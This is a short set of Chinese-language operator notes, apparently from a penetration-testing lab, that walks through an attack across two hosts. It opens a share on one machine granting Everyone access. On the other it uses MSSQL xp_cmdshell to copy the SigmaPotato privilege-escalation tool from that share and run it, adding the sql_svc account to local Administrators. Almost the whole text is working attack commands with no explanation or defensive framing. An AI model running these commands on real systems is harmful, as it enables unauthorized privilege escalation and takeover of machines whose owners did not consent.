在147上共享一个目录
net share Myshare=c:\Users\eric.wallows /GRANT:Everyone,FULL
授权 Everyone 拥有读取权限
icacls "C:\Users\eric.wallows\SigmaPotato.exe" /grant Everyone:R
icacls "C:\Users\eric.wallows" /grant Everyone:RX



在148上下载文件
EXEC xp_cmdshell 'net use Z: \\10.10.111.147\Myshare';


EXEC xp_cmdshell 'copy Z:\SigmaPotato.exe C:\Users\Public\SigmaPotato.exe';


EXEC xp_cmdshell 'copy Z:\SigmaPotato.exe C:\Users\Public\SigmaPotato.exe';


2.提升权限

将加入管理员sql_svc
EXEC xp_cmdshell 'C:\Users\Public\SigmaPotato.exe "net localgroup Administrators sql_svc /add"'
